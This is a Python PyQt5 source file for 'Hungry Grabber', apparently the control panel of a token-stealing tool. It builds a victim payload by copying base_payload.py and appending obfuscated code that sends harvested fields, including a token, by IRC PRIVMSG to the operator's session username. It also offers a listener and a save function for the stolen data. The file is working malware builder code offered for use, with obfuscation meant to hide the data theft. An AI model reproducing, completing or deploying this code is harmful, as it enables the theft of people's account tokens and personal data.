# -*- coding: utf-8 -*-

from PyQt5 import QtWidgets, QtGui
from PyQt5.QtGui import QPixmap
#from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5.QtWidgets import *
from menu import Show_menu
import sys, os

class My_main(object):

	def setupUi(self, win):
		win.setObjectName("MainWindow")
		win.setFixedSize(930, 670)
		win.setStyleSheet("background-color: white")

		self.info_session1 = QtWidgets.QLabel(win)
		self.info_session2 = QtWidgets.QLabel(win)
		self.info_session1.setText("You can  create a new session with a new payload")
		self.info_session2.setText("or relaunch an old one...")
		self.info_session1.setFont(QtGui.QFont("Funkturm", 12))
		self.info_session2.setFont(QtGui.QFont("Funkturm", 12))
		self.info_session1.setStyleSheet('color: #204B4E')
		self.info_session2.setStyleSheet('color: #204B4E')
		self.info_session1.setGeometry(200, 200, 550, 50)
		self.info_session2.setGeometry(100, 100, 310, 50)
		self.info_session1.move(200, 80)
		self.info_session2.move(343, 130)

		self.create_session = QtWidgets.QPushButton(win)
		self.create_session.setText("Create a new session")
		self.create_session.setGeometry(266, 230, 390, 70)
		#self.create_session.setStyleSheet('background-color: #A6B7D3;color: #353537')
		self.create_session.setFont(QtGui.QFont("Funkturm", 11))
		self.create_session.setStyleSheet("background-color: #EDFEFF;border-style: outset;border-width: 2px;border-radius: 15px;border-color: black;padding: 4px;")
		#self.create_session.setStyleSheet('background-color: #B9CDD7')
		self.create_session.clicked.connect(lambda: self.session_log(win, True))

		self.join_session = QtWidgets.QPushButton(win)
		self.join_session.setText("join a session")
		self.join_session.setGeometry(266, 330, 390, 70)
		#self.join_session.setStyleSheet('background-color: #A6B7D3;color: #353537')
		self.join_session.setFont(QtGui.QFont("Funkturm", 11))
		self.join_session.setStyleSheet("background-color: #EDFEFF;border-style: outset;border-width: 2px;border-radius: 15px;border-color: black;padding: 4px;")
		#self.join_session.setStyleSheet('background-color: #B9CDD7')
		self.join_session.clicked.connect(lambda: self.session_log(win, False))

	def session_log(self, win, choice):
		if choice == False:
			self.create = False
		else:
			self.create = True

		self.info_session1.clear()
		self.info_session2.clear()
		self.create_session.deleteLater()
		self.join_session.deleteLater()

		self.pushButton = QtWidgets.QPushButton(win)
		self.pushButton.setText("Start")
		self.pushButton.setGeometry(380, 234, 170, 30)
		#self.pushButton.setStyleSheet('background-color: #A6B7D3;color: #353537')
		self.pushButton.setStyleSheet("background-color: #EDFEFF;border-style: outset;border-width: 2px;border-radius: 15px;border-color: black;padding: 4px;")
		self.pushButton.setFont(QtGui.QFont("Funkturm", 11))
		self.pushButton.clicked.connect(lambda: self.start_co(self.lineEdit.text()))
		self.pushButton.show()

		self.label = QtWidgets.QLabel(win)
		self.label.setText("Your session\'s username :")
		self.label.setFont(QtGui.QFont("Funkturm", 12))
		self.label.setStyleSheet('color: #204B4E')
		self.label.setGeometry(320, 100, 310, 50)
		self.label.show()

		self.lineEdit = QtWidgets.QLineEdit(win)
		self.lineEdit.setFont(QtGui.QFont("Funkturm", 11))
		self.lineEdit.setGeometry(365, 162, 195, 40)
		self.lineEdit.show()


	def start_co(self, resp):

		self.label.clear()
		self.pushButton.deleteLater()
		self.lineEdit.deleteLater()

		self.irc_user = resp

		if self.create == True:

			with open("base_payload.py", 'r') as modif:
				with open("YOUR_PAYLOAD.py", 'w') as payload:
					for line in modif.read().splitlines():
						payload.write(f"{line}\n")
					payload.write(f"\n        if len(O00O0O0OO0O.OO00O0OO0)==0:\n            O000O000O=('PRIVMSG {self.irc_user}x4hs ' + O00O0O0OO0O.O00OO0OO0 + 'zb_xs' + O00O0O0OO0O.O00OO00O0 + 'zb_xs' + O00O0O0OO0O.O0O0O000O + 'zb_xs' + 'No token found' + 'zb_xs' + O00O0O0OO0O.O0OOO0O00 + '\\n')\n        else:\n            O000O000O=('PRIVMSG {self.irc_user}x4hs ' + O00O0O0OO0O.O00OO0OO0 + 'zb_xs' + O00O0O0OO0O.O00OO00O0 + 'zb_xs' + O00O0O0OO0O.O0O0O000O + 'zb_xs' + O00O0O0OO0O.OO00O0OO0[0] + 'zb_xs' + O00O0O0OO0O.O0OOO0O00 + '\\n')\n        O00O0O0OO0O.O00O0OO0O.send(O000O000O.encode())\n        O00O0O0OO0O.O00O0OO0O.close()\ne=O00OO00O()\ne.O0O0OO0OOO0O()")

		start_menu = Show_menu(win)
		self.launch_connexionON = QtWidgets.QPushButton(win)
		self.launch_connexionON.setText("Switch On")
		self.launch_connexionON.setGeometry(5, 25, 170, 30)
		self.launch_connexionON.setStyleSheet("background-color: #EDFEFF;border-style: outset;border-width: 2px;border-radius: 15px;border-color: black;padding: 4px;")
		self.launch_connexionON.setFont(QtGui.QFont("Funkturm", 11))
		self.launch_connexionON.clicked.connect(lambda: start_menu.connect(win, self.irc_user))
		self.launch_connexionON.show()

		self.launch_quit = QtWidgets.QPushButton(win)
		self.launch_quit.setText("Exit")
		self.launch_quit.setGeometry(5, 65, 170, 30)
		self.launch_quit.setStyleSheet("background-color: #EDFEFF;border-style: outset;border-width: 2px;border-radius: 15px;border-color: black;padding: 4px;")
		self.launch_quit.setFont(QtGui.QFont("Funkturm", 11))
		self.launch_quit.clicked.connect(lambda: start_menu.exit_())
		self.launch_quit.show()

		self.save_all = QtWidgets.QPushButton(win)
		self.save_all.setText("Save")
		self.save_all.setGeometry(745, 41, 170, 30)
		self.save_all.setStyleSheet("background-color: #EDFEFF;border-style: outset;border-width: 2px;border-radius: 15px;border-color: black;padding: 4px;")
		self.save_all.setFont(QtGui.QFont("Funkturm", 11))
		self.save_all.clicked.connect(lambda: start_menu.save_folder())
		self.save_all.show()

		info_msg = QMessageBox()
		info_msg.setWindowTitle("Important !")
		info_msg.setIcon(QMessageBox.Information)
		info_msg.setText("Keep your session username with you, you can quit at any time and come back with it whenever you want.\nBut don\'t forget that if the listeneur is not opened no data can be reveived !")
		info_msg.setFont(QtGui.QFont("Funkturm", 12))
		show_mdg = info_msg.exec_()


app = QtWidgets.QApplication(sys.argv)
win = QMainWindow()
win.setWindowTitle("Hungry Grabber")

ui = My_main()
ui.setupUi(win)

win.show()
sys.exit(app.exec_())
